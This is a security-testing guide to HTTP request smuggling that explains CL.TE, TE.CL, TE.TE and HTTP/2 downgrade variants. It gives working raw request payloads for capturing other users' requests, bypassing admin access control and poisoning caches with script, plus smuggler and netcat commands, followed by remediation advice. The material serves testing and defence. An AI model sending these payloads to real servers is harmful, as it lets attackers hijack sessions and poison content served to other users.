# HTTP Request Smuggling Testing

## Overview
HTTP Request Smuggling exploits discrepancies in how front-end (proxy/load balancer) and back-end servers parse HTTP request boundaries. By crafting ambiguous requests with conflicting `Content-Length` and `Transfer-Encoding` headers, an attacker can "smuggle" a second request inside the first, leading to cache poisoning, credential hijacking, request routing manipulation, and access control bypass.

## Classification
- **CWE:** CWE-444 (Inconsistent Interpretation of HTTP Requests)
- **OWASP:** A05:2021 - Security Misconfiguration
- **CVSS Base:** 7.5 - 9.8

## Detection Methodology

### 1. Identify Architecture
Smuggling requires a multi-tier HTTP stack:
- Reverse proxy + application server (Nginx + Apache, HAProxy + Node.js)
- CDN + origin server (CloudFront, Cloudflare, Akamai + backend)
- Load balancer + application
- API gateway + microservice

### 2. CL.TE (Content-Length wins on front-end, Transfer-Encoding on back-end)
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
The front-end uses `Content-Length: 13` and forwards all 13 bytes. The back-end uses `Transfer-Encoding: chunked`, sees `0\r\n\r\n` as the end of the first request, and treats `SMUGGLED` as the start of a new request.

**Detection probe:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```
If the response is delayed or the next request is corrupted, CL.TE smuggling is likely.

### 3. TE.CL (Transfer-Encoding wins on front-end, Content-Length on back-end)
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```
The front-end uses chunked encoding and forwards the complete chunked body. The back-end uses `Content-Length: 3`, processes only `8\r\n`, and the remaining data becomes the next request.

**Detection probe:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

1
Z
Q
```

### 4. TE.TE (Both support Transfer-Encoding, but obfuscation causes disagreement)
Obfuscate the `Transfer-Encoding` header so one server processes it and the other ignores it:
```http
Transfer-Encoding: chunked
Transfer-Encoding: cow

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-encoding: x

Transfer-Encoding:[tab]chunked

Transfer-Encoding: xchunked
```

### 5. HTTP/2 Downgrade Smuggling (H2.CL, H2.TE)
When a front-end proxy downgrades HTTP/2 to HTTP/1.1 for the back-end:

**H2.CL smuggling:**
```
:method POST
:path /
:authority target.com
content-length: 0

SMUGGLED_REQUEST
```
HTTP/2 has no `Transfer-Encoding` concept. If the proxy converts to HTTP/1.1 and the back-end mishandles the `Content-Length`, smuggling occurs.

**H2 header injection via CRLF:**
```
Header: value\r\nTransfer-Encoding: chunked
```
HTTP/2 binary framing may allow CRLF in header values that get injected when downgraded to HTTP/1.1.

### 6. Desync Attack Payloads

**Capture other users' requests (CL.TE):**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 116
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

data=
```
The next legitimate user's request is appended to the `data=` parameter.

**Access control bypass:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 65
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1

```

**Cache poisoning via smuggling:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /static/main.js HTTP/1.1
Host: target.com
Content-Length: 10

x=<script>alert(1)</script>
```

## Tool Usage
```bash
# smuggler.py - automated detection
python3 smuggler.py -u https://target.com

# HTTP Request Smuggler (Burp Extension)
# Install from BApp Store → launch scan from Repeater

# h2csmuggler - HTTP/2 cleartext smuggling
python3 h2csmuggler.py -x https://target.com/ --test

# defparam/smuggler
python3 smuggler.py -u https://target.com -m CL-TE

# Manual testing with netcat (raw request control)
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' \
  | nc target.com 80

# Turbo Intruder (Burp) for timing-based detection
# Use request-smuggling/detect-cl-te.py template
```

## Remediation
1. **Normalize request parsing** -- ensure front-end and back-end agree on request boundaries
2. **Reject ambiguous requests** -- deny requests with both Content-Length and Transfer-Encoding
3. **Use HTTP/2 end-to-end** -- avoid HTTP/1.1 downgrading between tiers
4. **Disable connection reuse** -- between proxy and back-end (performance tradeoff)
5. **Update proxy/server software** -- patch known parsing inconsistencies
6. **WAF rules** -- detect duplicate or obfuscated Transfer-Encoding headers
7. **Use same web server software** -- across all tiers to reduce parsing discrepancies

## Evidence Collection
- Exact raw request bytes (include CRLF positions, hex dump if needed)
- Front-end and back-end server identification (Server headers, version)
- Smuggling variant confirmed (CL.TE, TE.CL, TE.TE, H2.CL)
- Response discrepancy demonstrating the desync
- Impact demonstration (credential capture, access control bypass, cache poisoning)
- Timing differences observed during detection
- Infrastructure topology (CDN, proxy, origin server versions)
